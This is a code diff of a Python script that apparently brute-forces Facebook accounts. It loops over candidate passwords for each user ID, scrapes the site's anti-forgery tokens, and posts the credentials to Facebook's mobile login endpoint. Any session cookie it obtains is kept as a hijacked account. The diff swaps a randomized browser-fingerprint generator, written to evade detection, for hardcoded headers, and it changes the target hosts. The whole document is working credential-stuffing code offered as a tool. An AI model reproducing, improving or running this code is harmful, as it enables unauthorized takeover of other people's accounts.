@@ -1665,168 +1665,6 @@ def x(uid,pwx,tl):
         #print({error})
         pass
 
-def _generate_ua_apui():
-    chrome_ver  = random.randint(120, 149)
-    firefox_ver = random.randint(118, 136)
-    edge_ver    = random.randint(120, 148)
-    patch_ver   = random.randint(6000, 8500)
-    sub_ver     = random.randint(100, 300)
-
-    android_devices = [
-        ('13',  'Pixel 7',          'BP1A.240505.004'),
-        ('13',  'Pixel 7 Pro',      'TQ3A.230901.001'),
-        ('14',  'Pixel 8',          'AD1A.240905.004'),
-        ('14',  'Pixel 8 Pro',      'UQ1A.231205.015'),
-        ('15',  'Pixel 9',          'AP3A.241205.013'),
-        ('13',  'SM-S918B',         'TP1A.220624.014'),
-        ('13',  'SM-A546B',         'TP1A.220624.014'),
-        ('12',  'SM-G991B',         'SP1A.210812.016'),
-        ('14',  'CPH2447',          'UP1A.231005.007'),
-        ('13',  'M2102J20SG',       'TP1A.220624.014'),
-        ('14',  'V2309A',           'UP1A.231005.007'),
-    ]
-
-    windows_versions = ['10.0', '11.0']
-    mac_versions     = ['10_15_7', '11_0_0', '12_0_0', '13_0_0', '14_0_0']
-
-    ua_type = random.choice([
-        'chrome_android',
-        'chrome_android',
-        'chrome_android',
-        'chrome_windows',
-        'chrome_mac',
-        'edge_windows',
-        'firefox_android',
-        'firefox_windows',
-    ])
-
-    if ua_type == 'chrome_android':
-        av, dev, build = random.choice(android_devices)
-        ua = (
-            f'Mozilla/5.0 (Linux; Android {av}; {dev} Build/{build}) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Mobile Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?1'
-        sec_ch_ua_model            = f'"{dev}"'
-        sec_ch_ua_platform         = '"Android"'
-        sec_ch_ua_platform_version = f'"{av}.0.0"'
-
-    elif ua_type == 'chrome_windows':
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    elif ua_type == 'chrome_mac':
-        mv = random.choice(mac_versions)
-        mv_dot = mv.replace('_', '.')
-        ua = (
-            f'Mozilla/5.0 (Macintosh; Intel Mac OS X {mv}) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Google Chrome";v="{chrome_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Google Chrome";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"macOS"'
-        sec_ch_ua_platform_version = f'"{mv_dot}"'
-
-    elif ua_type == 'edge_windows':
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64) '
-            f'AppleWebKit/537.36 (KHTML, like Gecko) '
-            f'Chrome/{chrome_ver}.0.0.0 Safari/537.36 '
-            f'Edg/{edge_ver}.0.0.0'
-        )
-        sec_ch_ua = (
-            f'"Chromium";v="{chrome_ver}", '
-            f'"Microsoft Edge";v="{edge_ver}", '
-            f'"Not-A.Brand";v="24"'
-        )
-        sec_ch_ua_full_version_list = (
-            f'"Chromium";v="{chrome_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Microsoft Edge";v="{edge_ver}.0.{patch_ver}.{sub_ver}", '
-            f'"Not-A.Brand";v="24.0.0.0"'
-        )
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    elif ua_type == 'firefox_android':
-        av, dev, build = random.choice(android_devices)
-        ua = (
-            f'Mozilla/5.0 (Android {av}; Mobile; rv:{firefox_ver}.0) '
-            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
-        )
-        sec_ch_ua                  = ''
-        sec_ch_ua_full_version_list = ''
-        sec_ch_ua_mobile           = '?1'
-        sec_ch_ua_model            = f'"{dev}"'
-        sec_ch_ua_platform         = '"Android"'
-        sec_ch_ua_platform_version = f'"{av}.0.0"'
-
-    else:  # firefox_windows
-        wv = random.choice(windows_versions)
-        ua = (
-            f'Mozilla/5.0 (Windows NT {wv}; Win64; x64; rv:{firefox_ver}.0) '
-            f'Gecko/{firefox_ver}.0 Firefox/{firefox_ver}.0'
-        )
-        sec_ch_ua                  = ''
-        sec_ch_ua_full_version_list = ''
-        sec_ch_ua_mobile           = '?0'
-        sec_ch_ua_model            = '""'
-        sec_ch_ua_platform         = '"Windows"'
-        sec_ch_ua_platform_version = f'"{wv}.0"'
-
-    return {
-        'ua':                          ua,
-        'sec_ch_ua':                   sec_ch_ua,
-        'sec_ch_ua_full_version_list': sec_ch_ua_full_version_list,
-        'sec_ch_ua_mobile':            sec_ch_ua_mobile,
-        'sec_ch_ua_model':             sec_ch_ua_model,
-        'sec_ch_ua_platform':          sec_ch_ua_platform,
-        'sec_ch_ua_platform_version':  sec_ch_ua_platform_version,
-    }
-
-
 def mobile(uid,pwx,tl):
     global oks
     global cps
@@ -1838,83 +1676,48 @@ def mobile(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            _ua_d  = _generate_ua_apui()
-            _agent = _ua_d['ua']
-            _sch_ua     = _ua_d['sec_ch_ua']
-            _sch_full   = _ua_d['sec_ch_ua_full_version_list']
-            _sch_mob    = _ua_d['sec_ch_ua_mobile']
-            _sch_mod    = _ua_d['sec_ch_ua_model']
-            _sch_plat   = _ua_d['sec_ch_ua_platform']
-            _sch_platv  = _ua_d['sec_ch_ua_platform_version']
             url = 'https://m.beta.facebook.com/login/'
-            headi = {
-                'Host': 'm.beta.facebook.com',
-                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Upgrade-Insecure-Requests': '1',
-                'User-Agent': _agent,
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'none',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Priority': 'u=0, i',
-            }
-            headi['Sec-Ch-Ua']                   = _sch_ua
-            headi['Sec-Ch-Ua-Full-Version-List'] = _sch_full
-            headi['Sec-Ch-Ua-Mobile']            = _sch_mob
-            headi['Sec-Ch-Ua-Model']             = _sch_mod
-            headi['Sec-Ch-Ua-Platform']          = _sch_plat
-            headi['Sec-Ch-Ua-Platform-Version']  = _sch_platv
+            headi = {"authority": "m.prod.facebook.com",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "dpr": "3",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "none",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": anjay(),
+            "viewport-width": "980"}
             q  = Session.get(url, headers=headi)
             rt = q.text
-            hsku = ''
-            _m = re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt)
-            if _m: hsku = _m.group(1)
-            ccgku = ''
-            _m = re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt)
-            if _m: ccgku = _m.group(1)
-            revku = ''
-            _m = re.search(r'consistency[^}]*rev:(\d+)', rt)
-            if not _m: _m = re.search(r'"rev"\s*:\s*(\d+)', rt)
-            if not _m: _m = re.search(r'\brev:(\d+)', rt)
-            if _m: revku = _m.group(1)
-            hsiku = ''
-            _m = re.search(r'"hsi"\s*:\s*"([^"]+)"', rt)
-            if _m: hsiku = _m.group(1)
-            dtsg = ''
-            _m = re.search(r'"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"', rt)
-            if not _m: _m = re.search(r'"token"\s*:\s*"([A-Za-z0-9_\-]+:[0-9]+:[0-9]+)"', rt)
-            if _m: dtsg = _m.group(1)
-            jazoest = ''
-            _m = re.search(r"""name=["']jazoest["']\s+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r"""<input[^>]+name=["']jazoest["'][^>]+value=["']([^"']+)["']""", rt)
-            if _m: jazoest = _m.group(1)
-            lsd = ''
-            _m = re.search(r"""name=["']lsd["']\s+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r"""<input[^>]+name=["']lsd["'][^>]+value=["']([^"']+)["']""", rt)
-            if not _m: _m = re.search(r'"lsd"\s*:\s*"([^"]+)"', rt)
-            if _m: lsd = _m.group(1)
-            headers = {
-                'accept': '*/*',
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-                'cache-control': 'no-cache',
-                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
-                'origin': 'https://m.beta.facebook.com',
-                'pragma': 'no-cache',
-                'priority': 'u=1, i',
-                'referer': 'https://m.beta.facebook.com/login/',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': _sch_ua,
-                'sec-ch-ua-full-version-list': _sch_full,
-                'sec-ch-ua-mobile': _sch_mob,
-                'sec-ch-ua-model': _sch_mod,
-                'sec-ch-ua-platform': _sch_plat,
-                'sec-ch-ua-platform-version': _sch_platv,
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin',
-                'user-agent': _agent,
-            }
+            headers = {"authority": "www.facebook.com",
+            "method": "POST",
+            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
+            "scheme": "https",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "dpr": "3",
+            "origin": "https://www.facebook.com",
+            "referer": "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
+            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-model": "\"\"",
+            "sec-ch-ua-platform": "\"Linux\"",
+            "sec-ch-ua-platform-version": "\"\"",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+           "sec-fetch-site": "same-origin",
+           "sec-fetch-user": "?1",
+           "upgrade-insecure-requests": "1",
+           "user-agent": anjay(),
+           "viewport-width": "980"}
             params = {
                 'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
                 'type': 'action',
@@ -1926,16 +1729,16 @@ def mobile(uid,pwx,tl):
                 '__user': '0',
                 '__a': '1',
                 '__req': 'k',
-                '__hs': hsku,
+                '__hs': re.search(r'"haste_session"\s*:\s*"([^"]+)"', rt).group(1),
                 'dpr': '3',
-                '__ccg': ccgku,
-                '__rev': revku,
+                '__ccg': re.search(r'"connectionClass"\s*:\s*"([^"]+)"', rt).group(1),
+                '__rev': re.search(r'(?:consistency[^}]*rev:|\"rev\"\s*:\s*|\brev:)(\d+)', rt).group(1),
                 '__s': '',
-                '__hsi': hsiku,
+                '__hsi': re.search(r'"hsi"\s*:\s*"([^"]+)"', rt).group(1),
                 '__dyn': '',
-                'fb_dtsg': dtsg,
-                'jazoest': jazoest,
-                'lsd': lsd,
+                'fb_dtsg': re.search(r'(?:\"dtsg\"\s*:\s*\{\s*\"token\"\s*:\s*\"|\"token\"\s*:\s*\")([^"]+)', rt).group(1),
+                'jazoest': re.search(r'(?:name=["\']jazoest["\']\s+value=["\']|<input[^>]+name=["\']jazoest["\'][^>]+value=["\'])([^"\']+)', rt).group(1),
+                'lsd':  re.search(r'(?:name=["\']lsd["\']\s+value=["\']|<input[^>]+name=["\']lsd["\'][^>]+value=["\']|"lsd"\s*:\s*")([^"\']+)', rt).group(1),
                 'params': json.dumps({
                     "params": json.dumps({
                         "server_params": {
@@ -2038,7 +1841,7 @@ def mobile(uid,pwx,tl):
                     })
                 }),
             }
-            pr = Session.post('https://m.beta.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
+            pr = Session.post('https://p.facebook.com/async/wbloks/fetch/', headers=headers, data=data, params=params)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
